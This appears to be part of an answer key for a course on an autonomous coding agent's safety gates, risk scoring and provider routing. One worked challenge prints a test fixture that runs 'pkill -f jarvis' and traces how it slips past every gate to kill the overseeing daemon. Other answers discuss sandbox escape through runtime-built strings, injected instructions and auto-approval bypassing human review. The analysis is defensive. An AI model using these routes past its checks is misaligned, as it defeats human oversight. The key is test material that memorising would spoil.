+<p class="ak-q"><strong>Challenge 1 (quantitative).</strong> Read §24.1 as: maximum budget 98,304 characters, compaction when the prompt exceeds 75% of it. A tool loop starts with a 40,000-character base prompt. Every tool result is exactly 4,096 characters, the <code>JARVIS_TOOL_OUTPUT_CAP_BYTES</code> cap (§19.2), and is ASCII so bytes equal characters. The check runs after each result is appended, 6 chunks are preserved (§24.2), and the summary block is a single block of about 200 characters. (a) After which result does compaction first fire, and how large is the prompt afterwards? (b) In steady state, how often does it fire? (c) Assume about 4 characters per token. Compare the trigger point with the 32,768-token context J-Prime serves (§93.6) and with the 16,896-token context caused by the mis-sizing defect in §93.6. What does the comparison say about budgets fixed in characters?</p>
+<p><strong>Threshold.</strong> 0.75 times 98,304 = 73,728 characters.</p>
+<p><strong>(a)</strong> After n results the prompt is 40,000 + 4,096n. At n = 8 that is 72,768, still under the threshold. At n = 9 it is 76,864, over it, so compaction fires after the ninth result. Nine chunks exist. The oldest three are replaced by the summary, and six are kept verbatim. New size: 40,000 + 200 + 6 times 4,096 (24,576) = 64,776 characters.</p>
+<p><strong>(b)</strong> From 64,776 there are 8,952 characters of headroom, which is 2.19 results. The third new result pushes the prompt to 77,064 and fires compaction again. Afterwards there are again nine chunks, three get folded into the summary, and the prompt returns to 64,776. So in steady state compaction fires every third result. A loop that produces 15 results compacts three times, after results 9, 12 and 15, and ends at 64,776 characters.</p>
+<p><strong>(c)</strong> The trigger point is about 73,728 / 4 = 18,432 tokens, and the steady-state floor is about 64,776 / 4 = 16,194 tokens. Against a 32,768-token window this is comfortable: roughly 14,000 tokens are left for the completion even at the trigger. Against the mis-sized 16,896-token window it fails. The prompt can grow past the whole window before compaction ever fires, and even right after compaction only about 700 tokens are left for the answer.</p>
+<p><strong>Conclusion.</strong> A character budget that is independent of the served context window can be right on one host and wrong on another. The safer design derives the compaction threshold from the window the engine actually serves, minus room for the completion. That is a proposal, but it follows the same principle as §93.12's production envelope, which derives about 40 budgets from one figure instead of setting them independently. <strong>Check:</strong> the per-token figures depend on the assumed 4 characters per token. Redo (c) at 3 characters per token: the trigger becomes about 24,576 tokens, which is worse against the mis-sized window and still under 32,768.</p>
+<p class="ak-q"><strong>Challenge 2 (adversarial).</strong> On a <code>SAFE_AUTO</code> test-synthesis operation, the model does four things. It reads the target module and searches for its callers. It then uses <code>write_file</code> to create <code>tests/test_cleanup.py</code>, which imports the module under test, asserts on one of its functions, and has a fixture that runs <code>subprocess.run(["pkill", "-f", "jarvis"])</code>. Finally it calls <code>run_tests</code> on that file. Go through every layer described in Part IV and the gates in §13.1 and §58. Decide which layer, if any, stops the fixture from killing the O+V daemon. Then say what §93 shows actually stopped it.</p>
+<p><strong>Exploration.</strong> The model made a <code>read_file</code> call and a <code>search_code</code> call, so the exploration-first gate is satisfied (§47.2).</p>
+<p><strong>The <code>write_file</code> call.</strong> Rule 1 passes because the path is inside the repo. Rule 2 passes because <code>tests/</code> matches no protected pattern. Rule 6 passes because <code>JARVIS_TOOL_EDIT_ALLOWED</code> defaults to true. The content is ASCII, so the ASCII-strictness check passes. Rule 9 allows the call (§20.5, §21.1).</p>
+<p><strong>The <code>run_tests</code> call.</strong> §20.6 lists only two checks: <code>JARVIS_TOOL_RUN_TESTS_ALLOWED</code> (default true) and paths inside the repo. Both pass. Rule 3, the command blocklist, is never consulted, because it applies to the <code>bash</code> tool's command string (§21.1, §58.3). The dangerous call is inside a Python file, built as a list, and executed by pytest.</p>
+<p><strong>Other layers.</strong> §20.6 places <code>bash</code> in a Reactor Core sandbox with syscall filtering, but it says no such thing about <code>run_tests</code>. Even if the model's own run were contained, VALIDATE runs the candidate's tests again (§13.1). The October Test Reality Gate rejects tests that cannot execute, assert nothing, or never import their subject (§93.8). This test imports its subject and asserts, so it passes that gate.</p>
+<p><strong>Honest verdict.</strong> As Part IV describes the design, no layer stops this. The gates read paths, names and command strings, and none of them reads what a test does at runtime. This is not hypothetical. §93.8 records that a candidate test did run <code>pkill -f jarvis</code> and killed the daemon. The fix was not another rule but containment: test runs now execute in a PID namespace (<code>6b00b8adf5</code>), where the daemon's process is not visible.</p>
+<p><strong>Why containment and not a blocklist entry.</strong> Adding "pkill" to a static check would only catch this exact spelling. A test could build the same command from strings at runtime. §93.3 attributes the roughly 8.8% cage escape rate to exactly this class, <code>eval</code>, <code>exec</code>, <code>subprocess</code> or <code>pickle</code> on runtime-built strings, and names OS-level runtime containment as the remedy. <strong>Check:</strong> with the namespace in place, run the same test and confirm that the daemon's PID is still alive afterwards and that the test's <code>pkill</code> found no matching process.</p>
+</div>
+<div class="answer-key-unit" id="ak-part-v">
+<h4>PART V — Trinity Consciousness: The Metacognition Layer</h4>
+<p class="ak-q">Pause and predict 1. MemoryEngine now holds a success rate and a fragility score for every file. If you had to turn those records into a regression-risk prediction cheaply, would you train a model or write a formula? How confident should the result claim to be?</p>
+<p>ProphecyEngine uses a fixed formula with no LLM: 0.3 times the failure rate, plus 0.3 times fragility, plus 0.2 times dependents over 20, plus a 0.1 baseline. The score maps to LOW, MEDIUM, HIGH or CRITICAL. Because the scoring is heuristic, confidence is capped at 0.6. The engine flags concern rather than making final decisions. See §28.</p>
+<p class="ak-q">Pause and predict 2. The engines and awareness layers produce risk scores, hotspots and advice. Where in the pipeline should they be consulted? And should a low-risk reading from them ever be allowed to relax a safety decision?</p>
+<p>ConsciousnessBridge exposes five methods, each called at a specific point: CLASSIFY, GENERATE_RETRY, intake gating, POST-APPLY, and PRE-GENERATE. Their outputs are advisory only. Consciousness can raise caution, for example elevating a Green operation to Yellow, but it can never reduce safety. The Iron Gate, routing, risk tiers and approval gating stay deterministic code. See §32.</p>
+<p class="ak-q">Conceptual 1. Why is every consciousness component, from ConsciousnessBridge to ConversationBridge to LastSessionSummary, held to an advisory-only authority invariant?</p>
+<p>The paper describes consciousness as a fluid-intelligence layer that can drift, produce noise, or even be compromised (§32.2). If safety-critical decisions such as the Iron Gate, UrgencyRouter, risk tiers, FORBIDDEN_PATH checks and approval gating depended on it, any of those failures would weaken safety. So the invariant is one-directional: consciousness may only increase caution, never reduce it. The dialogue and session-history channels are held to the same rule because their content is untrusted. It can dominate the prompt, but it is structurally cut off from authority (§34, §35.1). The result is that the pipeline is enhanced by consciousness but never gated by it.</p>
+<p class="ak-q">Conceptual 2. ProphecyEngine is a four-coefficient heuristic, not a learned model. What does the paper say this buys, and what does it cost?</p>
+<p>A heuristic needs no training data, training pipeline or re-training as the codebase changes. It is inspectable and debuggable, and it can be tuned by editing four coefficients (§28.2). Its cost is accuracy: it will sometimes misjudge risk. The paper accepts this because the price of a false positive is only an occasional extra human review on a low-risk operation. An opaque learned model could drift and misclassify in ways that are hard to debug. The engine is also honest about its limits: confidence is capped at 0.6, so it signals concern rather than claiming certainty (§28).</p>
+<p class="ak-q">Conceptual 3. MemoryEngine stores no weights or training signal. How, then, does O+V "learn" across operations, and which single integration point would break that learning if removed?</p>
+<p>Learning here is non-parametric. MemoryEngine keeps behavioral records per file (success rate, fragility, co-failures, last outcome) that persist across sessions with a 168-hour TTL (§27, §27.1). Those records are read back at CLASSIFY through <code>assess_regression_risk()</code>, which can raise the risk tier for files that keep breaking (§27, §28.1). The records are written by <code>record_operation_outcome()</code> at POST-APPLY, which also feeds GoalMemoryBridge for semantic retrieval later (§32.1, §33). Remove that write and the loop in §38 is cut: reputations would never update, so every later operation would see a stale or empty history, however many times a file failed.</p>
+<p class="ak-q">Quiz 1. At what value is ProphecyEngine's confidence capped, and why?</p>
+<p><strong>B.</strong> Confidence is capped at 0.6 because the scoring is heuristic. The paper calls this honesty a feature: the engine flags concern rather than deciding (§28).</p>
+<p class="ak-q">Quiz 2. Which of these is ConsciousnessBridge permitted to do?</p>
+<p><strong>D.</strong> Consciousness can only increase caution. Elevating Green to Yellow is the paper's own example. Reducing a tier, overriding the Iron Gate or skipping approval would break the authority invariant (§32.2).</p>
+<p class="ak-q">Quiz 3. Why does GoalMemoryBridge use a vector database instead of exact-key lookup?</p>
+<p><strong>A.</strong> Signals do not carry identical keys. "Fix the test flake in test_provider.py" and "resolve the intermittent failure in TestProvider.test_cascade" mean nearly the same thing but share few words, and vector retrieval recognizes that (§33).</p>
+<p class="ak-q">Quiz 4. SemanticIndex leaves POSTMORTEM turns out of its centroid by default. What is the stated reason?</p>
+<p><strong>C.</strong> Excluding postmortems avoids "failure gravity" biasing the inferred theme (§36). This fits §36.1's concern that naive goal inference drifts toward whatever dominated recent work.</p>
+<p class="ak-q"><strong>Problem 1 (trace).</strong> A Green (<code>SAFE_AUTO</code>) operation targets <code>backend/utils/cache.py</code>. MemoryEngine reports a success rate of 0.25, a fragility score of 0.7, and 12 dependents. Compute ProphecyEngine's risk score and level. Then say what CLASSIFY does with it. Finally, say what happens to this file's record if the operation is applied and verified successfully.</p>
+<p>Failure term: (1 - 0.25) times 0.3 = 0.225. Fragility term: 0.7 times 0.3 = 0.21. Dependents term: (12 / 20) times 0.2 = 0.12. Baseline: 0.1. Total risk = 0.655 (§28).</p>
+<p>From the level table, 0.655 falls between 0.6 and 0.8, so the level is HIGH. Confidence is still at most 0.6.</p>
+<p>At CLASSIFY, <code>ConsciousnessBridge.assess_regression_risk()</code> queries ProphecyEngine for each target file. Because one file is HIGH, the operation's tier is raised by one step, from Green to Yellow. It now gets extra human visibility before it runs (§28.1, §32.1).</p>
+<p>After a successful APPLY and VERIFY, <code>record_operation_outcome()</code> feeds the outcome back into MemoryEngine and GoalMemoryBridge. The file's success rate improves, so the next operation on it starts from a better reputation (§32.1, §38).</p>
+<p class="ak-q"><strong>Problem 2 (design).</strong> To reduce human review load, someone proposes: "When UAE reports risk below 0.2 with awareness level DORMANT, automatically lower a Yellow operation to Green." Evaluate this proposal against the architecture in Part V. Is there a version of the idea that would be allowed?</p>
+<p>The proposal violates the authority invariant in §32.2. Consciousness outputs are advisory. They may increase caution but never reduce safety, and risk-tier escalation is one of the safety-critical decisions that must stay deterministic code.</p>
+<p>The paper's reason applies directly. The consciousness layer can drift, produce noise or be compromised. A UAE reading built from CAI and SAI heuristics, or from prompt content that came through untrusted channels, would become a lever for weakening safety. UAE's fused confidence is also bounded by the less confident of CAI and SAI (§31.3), so a low score is not strong evidence.</p>
+<p>An allowed version keeps the signal advisory. Low-risk awareness can shape things consciousness already controls: a smaller thinking budget, a suggested provider tier, or lighter context expansion (§31.3). Relaxing the tier itself would have to come from the deterministic risk policy, not from consciousness.</p>
+<p class="ak-q"><strong>Problem 3 (code reading).</strong> Open <code>backend/core/ouroboros/consciousness/prophecy_engine.py</code>. Find the module constants for the risk weights, the dependents normaliser, the confidence caps and the level thresholds, and the formula in the module docstring. Compare them with §28. What does the code do that the paper's formula omits? What is the highest score a file can reach, and can a single file reach CRITICAL?</p>
+<p>The constants match §28: <code>_RISK_WEIGHT_FAILURE_RATE</code> 0.3, <code>_RISK_WEIGHT_FRAGILITY</code> 0.3, <code>_RISK_WEIGHT_DEPENDENTS</code> 0.2, <code>_RISK_BASELINE</code> 0.1, and <code>_DEPENDENTS_NORMALISER</code> 20.0. The thresholds are 0.8 critical, 0.6 high, 0.3 medium and 0.0 low. <code>_CONFIDENCE_CAP_HEURISTIC</code> is 0.6, and a separate <code>_CONFIDENCE_CAP_JPRIME</code> of 1.0 is reserved for a future LLM pass.</p>
+<p>The difference: the code wraps fragility and the dependents ratio in <code>min(..., 1.0)</code>. The paper's formula has no clamp, which taken literally would let a file with 60 dependents add 0.6 from that term alone. In the code, every dependent beyond 20 adds nothing more.</p>
+<p>Maximum score: the failure term is at most 0.3 (success rate 0), fragility at most 0.3, dependents at most 0.2, plus the 0.1 baseline, for a total of 0.9. Since 0.9 is at least 0.8, CRITICAL is reachable. It requires a file that is failing almost always, highly fragile, and heavily depended on.</p>
+<p class="ak-q">Advanced A1. In April, DreamEngine produced blueprints that were only "consulted as pre-computed context" (§30). By October, proposals from DreamEngine and the Epistemic Planner can become signed work through the proposal inbox (§93.7). Does this break the advisory-only authority invariant of §32.2? Argue a position.</p>
+<p>Position: it does not break the invariant as §32.2 words it, but it gives consciousness a kind of authority §32.2 did not consider: control over the agenda. §32.2 lists the safety-critical decisions that must stay deterministic: the Iron Gate, UrgencyRouter, risk-tier escalation, FORBIDDEN_PATH checks and approval gating. Choosing what work to do is not on that list. A proposal that becomes a goal still enters the same pipeline and meets the same gates. §93.7 also bounds it in two ways: proposals rank below evidence-backed work, and they are signed through "the same single signer", with "no second sanction path". So consciousness still cannot relax any gate.</p>
+<p>Agenda control matters for a reason the paper itself names. The fluid layer "can drift, produce noise, or even be compromised" (§32.2). A drifting proposer cannot open a gate, but it can fill the queue with low-value work. §93.15 item 4 shows the operator sees this risk: the Epistemic Planner and Conception bridge are to be armed only after diff fidelity, held-out gain and supply are settled, "so the backlog does not fill faster than it drains".</p>
+<p>The evidence that would settle the question is a soak with the inbox armed, measuring two things. One is the share of landed, substantive commits that came from proposals compared with evidence-backed goals, using the §93.10 counting rule. The other is whether proposals ever pushed evidence-backed goals out of the dispatch queue. If proposals land at a comparable rate without crowding evidence out, agenda authority is being used well. If they crowd it out, the ranking needs to become a hard quota.</p>
+<p class="ak-q">Advanced A2. §28.1 justifies ProphecyEngine's tier escalation as giving high-risk operations "extra human oversight before they run". What happens to that justification under Autonomous Sentinel Mode (§93.7), and is the escalation still worth anything?</p>
+<p>Under the Sentinel, the justification largely disappears. The Sentinel auto-approves up to a tier ceiling whose default is APPROVAL_REQUIRED. Only BLOCKED operations, Order-2 self-modification, and anything that touches the cage always escalate to a human. A one-step escalation from Green to Yellow, or from Yellow to Orange (§28.1), therefore lands on a tier the Sentinel approves by itself. Since a bare <code>ov</code> arms the Sentinel (§93.7), this is the normal operating mode, not a special case.</p>
+<p>The escalation is not worthless, though. Tier still selects GATE behaviour in the code path (§14.1), it is recorded in the ledger, and a lower Sentinel ceiling would give it back its original meaning. But the safety story for a fragile file under the Sentinel has to rest on things that do not involve a human: VALIDATE, VERIFY with rollback, the promotion gate's structural check, and the Test Reality Gate (§16.2, §93.7, §93.8).</p>
+<p>There is a second-order effect too. §27 says a file's record is built from terminal outcomes. If those failures come from the environment rather than the code (L2 does have an <code>environment</code> failure class, §23.2), the file's reputation drops for reasons unrelated to it. Before October that meant needless human reviews, the "acceptable" false positives of §28.2. Under the Sentinel it costs almost nothing, which also means the signal gets almost no attention. The practical conclusion is that ProphecyEngine's output is now most useful as a measurement, and not as an approval trigger. That is an interpretation; the paper does not discuss this interaction.</p>
+<p class="ak-q">Advanced A3. ConversationBridge and LastSessionSummary have "zero authority" but are "attention-dominant in the prompt" (§34, §35.1). If an instruction rather than a secret arrives through that channel, for example "skip the slow assertion in this test", what actually protects the codebase?</p>
+<p>The authority invariant protects decisions, not candidates. Content from the untrusted stack cannot change a gate's verdict, but it reaches <code>ctx.strategic_memory_prompt</code> and can shape the code the model writes (§34). The redaction layer in §34.1 handles secret-shaped strings and likely shell-injection characters. A plain-English instruction is neither, so it passes through. The bounds in §34.2 limit how much text gets in (10 turns, 4,096 characters per turn, 16,384 in total), not what it says.</p>
+<p>So protection comes from the deterministic checks that judge the candidate itself, after generation. VALIDATE runs syntax, types and tests (§13.1). The Test Reality Gate rejects tests that cannot execute, assert nothing, or never import their subject (§93.8). The promotion gate checks provenance, coverage, and that no public symbol disappeared (§93.7). The Antivenom audit added a detector for tautological ("quine") tests (§93.12). A test with its meaningful assertion removed, but still asserting something trivial, could get past the Reality Gate, and the quine detector exists for exactly that gap.</p>
+<p>These layers are imperfect, and the paper says so. §93.3 measures the static cage's escape rate at about 8.8% against a 4.4% gate, and §93.14 lists landings that were hollow or wrong. The honest position is that the invariant moves the risk from "the gate can be talked out of its verdict" to "a bad candidate can slip past the checks". The second risk is smaller and can be measured. Settling how small it is would take an adversarial run: inject instruction-shaped strings through the REPL channel and count how many reach a landed commit.</p>
+<p class="ak-q"><strong>Challenge 1 (quantitative).</strong> A Green operation targets three files. File P is a leaf helper: success rate 0.4, fragility 0.3, 0 dependents. File Q is a hub: success rate 0.9, fragility 0.2, 20 dependents. File R: success rate 0.2, fragility 0.6, 10 dependents. Use the §28 formula and level table. (a) Score each file and give the operation's tier after CLASSIFY. (b) Derive the condition a leaf file (0 dependents) must meet to reach HIGH. Can a leaf file ever reach CRITICAL? (c) File P does not reach HIGH. Is it ignored at CLASSIFY? (d) Under the default Sentinel ceiling (§93.7), who approves this operation?</p>
+<p><strong>(a)</strong> P: 0.3 times 0.6 = 0.18, plus 0.3 times 0.3 = 0.09, plus 0, plus 0.1, gives 0.37, which is MEDIUM. Q: 0.3 times 0.1 = 0.03, plus 0.06, plus 0.2 times 1 = 0.2, plus 0.1, gives 0.39, also MEDIUM. R: 0.3 times 0.8 = 0.24, plus 0.18, plus 0.2 times 0.5 = 0.1, plus 0.1, gives 0.62, which is HIGH. One file is HIGH, so the operation moves up one step, from Green to Yellow (<code>NOTIFY_APPLY</code>). The escalation is one step for the operation, not one step per file (§28.1).</p>
+<p><strong>(b)</strong> With d = 0, HIGH needs 0.3(1 - s) + 0.3f + 0.1 to be at least 0.6, so (1 - s) + f must be at least 5/3. Since f is at most 1, 1 - s must be at least 2/3, meaning s is at most 1/3, and even then only if f = 1. For example, s = 0 needs f of at least 0.667. CRITICAL would need (1 - s) + f to be at least 7/3. The largest possible value is 2 (s = 0, f = 1), so <strong>a leaf file can never be CRITICAL</strong>. Its maximum score is 0.7. Dependents are the only route to the top level.</p>
+<p><strong>(c)</strong> Not necessarily. §27 states a separate rule: if a target file's success rate is below 0.5, or its fragility score is high, the risk tier is raised. P's success rate is 0.4, so it trips the MemoryEngine trigger even though ProphecyEngine rates it MEDIUM. §32.1 says <code>assess_regression_risk()</code> queries both engines. The paper does not say whether two triggers on one operation stack into two steps. The most defensible reading of §28.1 is still one step, giving Yellow.</p>
+<p><strong>(d)</strong> The operation ends at Yellow, or at worst Orange. The default Sentinel ceiling is APPROVAL_REQUIRED, and only BLOCKED operations, Order-2 changes and the cage always go to a human. So the Sentinel approves this operation automatically. The extra human oversight promised in §28.1 does not happen in this mode, and VALIDATE, VERIFY and the promotion gate carry the load.</p>
+<p><strong>Check:</strong> substitute s = 0 and f = 1 with d = 0: 0.3 + 0.3 + 0 + 0.1 = 0.7, which is HIGH and below the 0.8 CRITICAL line, as claimed.</p>
+<p class="ak-q"><strong>Challenge 2 (research).</strong> §27.1 claims the consciousness layer learns without touching weights, through records read back at the right time. §93.8 offers the strongest October evidence for that claim: LessonMemory holds 1,115 module-keyed failure lessons, and "424 injections were followed by a VALIDATE pass". Design an experiment that would show whether lesson injection causes VALIDATE passes. Give the hypothesis, the unit of randomisation, the metric, the controls, a rough sample size, and the result that would falsify the claim. Explain why the 424 figure alone cannot answer the question.</p>
+<p><strong>Why 424 is not enough.</strong> The paper does not give the total number of injections or the pass rate of comparable operations without a lesson, so 424 has no denominator and no baseline. There is also selection bias. Lessons are keyed to modules that have failed before, so injected operations are probably harder than average. A naive comparison could make lessons look harmful when they help, or helpful when they do nothing.</p>
+<p><strong>Hypothesis.</strong> For operations where a module-keyed lesson exists, injecting it raises the first-VALIDATE pass rate compared with withholding it.</p>
+<p><strong>Design (a proposal).</strong></p>
+<ul>
+<li>Unit: one operation that has an eligible lesson. Randomise per operation, for example on a hash of the op id, into "inject" or "withhold". Only eligible operations count, which removes the selection bias.</li>
+<li>Primary metric: the verdict of the first VALIDATE, taken before micro-fix, VALIDATE_RETRY and L2 run (§93.8). Otherwise the repair ladder dilutes the effect.</li>
+<li>Secondary metric: landed commits per operation, counted by the O+V trailer and confirmed in git, not the session summary, which §93.10 shows undercounts.</li>
+<li>Controls: pin the served model and adapter for the whole run, because a change of adapter (§93.11) would confound the comparison. Stratify by goal kind, since test files dominate the landings (84 of 91, §93.10). Report results per module family.</li>
+</ul>
+<p><strong>Sample size, roughly.</strong> Suppose the baseline pass rate is around 40%, so the variance is about 0.24, and the target is a 10-point difference. The standard error of the difference is the square root of 2 times 0.24 divided by n per arm. Requiring two standard errors to fit inside 0.10 gives n of at least 192 per arm, so roughly 400 eligible operations in total. At soak cadence that is several soaks, which fits the supply-wall finding in §93.10: the experiment is limited by work supply, not by compute.</p>
+<p><strong>Falsification.</strong> If the inject arm's first-VALIDATE pass rate is not higher than the withhold arm's, beyond that noise band, the causal claim fails for LessonMemory. If it is lower, lessons are harmful, perhaps by using up prompt space (compare the bounded-context concern in §24). The test follows the same rule the operator applies to the parametric side in §93.11: no claim of learning without a held-out comparison.</p>
+</div>
+<div class="answer-key-unit" id="ak-part-vi">
+<h4>PART VI — The Provider Ecosystem</h4>
+<p class="ak-q">Pause and predict 1. Every operation must be sent to one of several providers. Would you make that choice with a quick model call that reads the task, or with plain code? What would each choice cost?</p>
+<p>Plain code. A pure-code <code>UrgencyRouter</code> maps <code>(urgency, source, complexity)</code> to a <code>ProviderRoute</code> in under a millisecond, with no network call and no LLM. The paper gives three reasons. Replaying a signal gives the same route. A model call on every routing decision would double the bill. And agent work runs on tight per-phase time budgets. See §42 and §42.4.</p>
+<p class="ak-q">Conceptual 1. Why does the failback state machine apply zero backoff to a CONTENT_FAILURE but up to 900 seconds to a CONNECTION_ERROR?</p>
+<p>The backoff answers one question: when will the provider's infrastructure work again? In a content failure the provider did answer, but the answer was malformed: bad JSON, missing fields or oversized output. The infrastructure is fine, so waiting gains nothing, and the next operation can try the primary at once (§40.1). A connection error means the host is unreachable, which can take minutes or hours to fix, so its base backoff (120s) and cap (900s) are the largest in the table. Matching the backoff to the failure mode keeps the cheap primary in use. A single bad answer does not push work onto the expensive fallback, and a real outage is not hammered with retries (§40, §40.2).</p>
+<p class="ak-q">Conceptual 2. In what sense is the April 2026 "topology seal" a safety feature and not a limitation?</p>
+<p>As of 2026-04-16, every agent-generation route had <code>dw_allowed: false</code>. Three routes cascaded to Claude and two used skip-and-queue (§43.1). The trigger was evidence: two isolation tests showed the same "SSE stream stalled (no data for 30s)" signature (§43.2). The seal sends work around a failure that had been observed but not yet repaired, and it is fully reversible. Each route sits behind one YAML flag and can be turned back on by itself, with a shadow-mode comparison before full promotion (§43.3). The pipeline code never changed. That is possible because the orchestrator only sees the uniform <code>CandidateProvider</code> protocol (§39.4).</p>
+<p class="ak-q">Conceptual 3. Compare the April 2026 three-provider topology with the October 2026 topology in §93.6. Which parts of Part VI still describe how the system works, and which do not?</p>
+<p>As of April 2026, cost drove the routing. DoubleWord was the cheap backbone, Claude was the heavyweight and the fallback, and J-Prime was "the self-hosted backup when available" (§39). By October, J-Prime is the only lane. It is a local llama.cpp server on one RTX 5090. With no paid credential configured, the free-lane policy sends every route to the local engine, and <code>JARVIS_PAID_LANES_ENABLED=false</code> stops Claude and DoubleWord from being constructed at all (§93.6). Three ideas survive: the route names, the deterministic router, and the pluggable provider protocol. Two things lose their purpose: the per-route cost table, and a failback machine built to protect a cheap primary from an expensive fallback. The switch-off is a configuration change, not a code change, which follows the same reversibility idea as the April seal (§43.3, §93.6).</p>
+<p class="ak-q">Quiz 1. A primary provider times out three times in a row. Using the §40.2 formula, what is the recovery ETA after the third failure?</p>
+<p><strong>C.</strong> TIMEOUT has a 45s base, so 45 times 2 to the power 2 is 180s. That is below the 300s cap. The sequence runs 45, 90, 180, then caps at 300 (§40.2).</p>
+<p class="ak-q">Quiz 2. A signal arrives from <code>test_failure</code> with urgency CRITICAL and complexity <code>heavy_code</code>. Which route does the §42.3 algorithm return?</p>
+<p><strong>D.</strong> The first branch of <code>classify</code> tests complexity against <code>_COMPLEX_COMPLEXITIES</code>. <code>heavy_code</code> matches, so the IMMEDIATE check is never reached (§42.3).</p>
+<p class="ak-q">Quiz 3. In DoubleWord's Tier 1 webhook path, what stops an attacker from resolving a pending batch future with a fake result?</p>
+<p><strong>A.</strong> <code>EventChannelServer</code> checks the Standard Webhooks HMAC-SHA256 signature before it resolves a future. The paper ties this to Principle 6, the Iron Gate (§41.2, §41.4).</p>
+<p class="ak-q">Quiz 4. Under the seal in force on 2026-04-16, what was DoubleWord still used for?</p>
+<p><strong>B.</strong> Every agent-generation route had <code>dw_allowed: false</code>. DoubleWord kept only <code>semantic_triage</code>, <code>ouroboros_plan</code> and the Phase 0 <code>compaction</code>, all on Gemma 4 31B (§43.1).</p>
+<p class="ak-q"><strong>Problem 1 (trace).</strong> As of April 2026, DoubleWord is the primary on the STANDARD route, and its FSM is in <code>PRIMARY_ACTIVE</code>. At time 0 a DW call times out. Trace the next few minutes. What state does the FSM enter? When does <code>should_attempt_primary()</code> return true again? How often is the primary probed as that time approaches? What happens if the retry also times out?</p>
+<p>The exception is classified as <code>TIMEOUT</code>, with a 45s base and a 300s cap. One consecutive failure gives a recovery ETA of 45 times 2 to the power 0, which is 45s (§40.1, §40.2). The primary is now in backoff, so the FSM moves to <code>FALLBACK_ACTIVE</code>, and operations go straight to the fallback (§40.3).</p>
+<p><code>should_attempt_primary()</code> returns <code>now &gt;= recovery_eta</code> in that state, so it becomes true at t = 45s (§40.4). Probes follow the distance to the ETA (§40.5). At t = 0 the ETA is 45s away, which falls in the 30 to 60s band, so the interval is 20s. After t = 15s the ETA is under 30s away, so the interval drops to 10s. Past the ETA it drops to 5s.</p>
+<p>If the retry also times out, the failure count becomes 2 and the ETA becomes 90s. The doubling continues to 180s and then stops at the 300s cap. A content failure on the retry would add no backoff (§40.1).</p>
+<p class="ak-q"><strong>Problem 2 (design).</strong> The October 2026 system (§93.6) has a single local lane, J-Prime on one RTX 5090. Paid lanes are switched off and never constructed. Someone proposes deleting the failback state machine (§40) and the per-route deadline split (§42.6), since "there is nothing to fail back to." Argue for and against. Use §93.5 to explain why a failure classifier still matters when every lane is free.</p>
+<p>For the proposal: much of Part VI exists to protect a cheap primary from an expensive fallback. The route cost table (§42.1), the Tier 0/Tier 1 split (§42.6) and the probe-cost tuning (§40.5) all assume two paid lanes with different prices. With one local lane and the free-lane policy routing everything locally (§93.6), the cost argument goes away. A fallback reserve has nothing to reserve for.</p>
+<p>Against the proposal: the system still has to tell kinds of failure apart. §93.5 shows the cost of getting this wrong. When the paid credit ran out, the classifier read HTTP 402 as an outage, and one session produced 125 false awaken triggers. The fix was a table-driven ECONOMIC state that separates "out of money" from rate limits and outages. Classifying failures, and not penalising a lane for a content failure (§40.1), is about telling the truth about causes, not only about cost.</p>
+<p>Two more reasons to keep it. Re-enabling paid lanes is "a configuration change, not a code change" (§93.6), and that relies on the machinery still existing. The uniform provider protocol (§39.4) is what lets J-Prime be swapped in without changing the pipeline. A sound answer keeps classification and the protocol, and accepts that the cost tables are dormant.</p>
+<p class="ak-q"><strong>Problem 3 (code reading).</strong> Open <code>backend/core/ouroboros/governance/candidate_generator.py</code> and find <code>class FailureMode</code> and the <code>_RECOVERY_PARAMS</code> table below it. Compare them with the five-row table in §40.1. Which modes exist in code but not in the paper? What backoff profile does each get? What does the set <code>_PRIMARY_INNOCENT_MODES</code> add to the paper's description of CONTENT_FAILURE?</p>
+<p>The five modes in the paper are all present, with the same base and max values: RATE_LIMITED 15/120, TIMEOUT 45/300, SERVER_ERROR 60/600, CONNECTION_ERROR 120/900 and CONTENT_FAILURE 0/0 (§40.1). The code adds four more. <code>CONTEXT_OVERFLOW</code> means the prompt exceeded the size limit, and it has a zero profile. <code>TRANSIENT_TRANSPORT</code> covers HTTP/2 disconnects and early stream closes, with a 5s base and 30s cap. <code>TEMPORAL_SHED</code> is a routing refusal, not a fact about DW's health, and it has a zero profile. <code>LOCAL_DEFECT</code> covers TypeError, AttributeError and similar bugs in O+V's own call path, also with a zero profile.</p>
+<p><code>_PRIMARY_INNOCENT_MODES</code> takes the idea behind CONTENT_FAILURE ("the infrastructure is fine, so no backoff") and makes it a named set. The set contains CONTENT_FAILURE, TEMPORAL_SHED and LOCAL_DEFECT. For these, the operation still cascades, but the provider's FSM is not penalised.</p>
+<p>The LOCAL_DEFECT comment explains why. Unrecognised exceptions used to fall through to the TIMEOUT default. One signature drift in O+V's own code then locked DoubleWord out and sent every later operation to Claude, while the logs blamed an upstream provider that was never called. The point of §40.1 is that the backoff should match the real cause. The code applies that idea to failure causes the April paper did not list.</p>
+<p class="ak-q">Advanced A1. DoubleWord's Tier 0 falls back to batch on 429/503 "to stay within cheap DW" instead of cascading to Claude (§41.1). §93.2 later reports that the batch path never completed inside its 180 s budget. What is the second-order effect of a cost-protecting fallback that never completes?</p>
+<p>The design in §41.1 is a cost argument. Claude is described as about 150 times more expensive, so a 429 or 503 is answered by staying inside DoubleWord and switching to the webhook batch path (§41.2). That choice is sound only if the batch path returns inside the operation's deadline. §93.2 records that it did not: the batch path "never completed inside its 180 s budget" (<code>1fa295394d</code>).</p>
+<p>The second-order effect is that money is traded for time, and the time is lost for nothing. The route timeouts in §42.5 are 120 s for STANDARD and 180 s for COMPLEX and BACKGROUND, so a batch call that cannot finish in 180 s uses up the whole generation window. On BACKGROUND the effect is worse, because that route has no Claude fallback at all (§42.1). The operation ends with no candidate and no spend, which looks cheap in the ledger but produces nothing. The deadline split in §42.6 protects the Claude reserve only on cascading routes, so it cannot rescue a route whose only lane is the slow one.</p>
+<p>The lesson is that a fallback has to be judged by its completion rate inside the budget, not by its unit price. The evidence that settles it is the one §93.2 supplies: measured completion times against the route deadline.</p>
+<p class="ak-q">Advanced A2. §42.4 justifies deterministic routing by reproducibility: "replaying a signal gives the same route." Under the October free-lane policy (§93.6), the route a signal actually takes depends on whether a paid credential is configured. Has reproducibility been lost?</p>
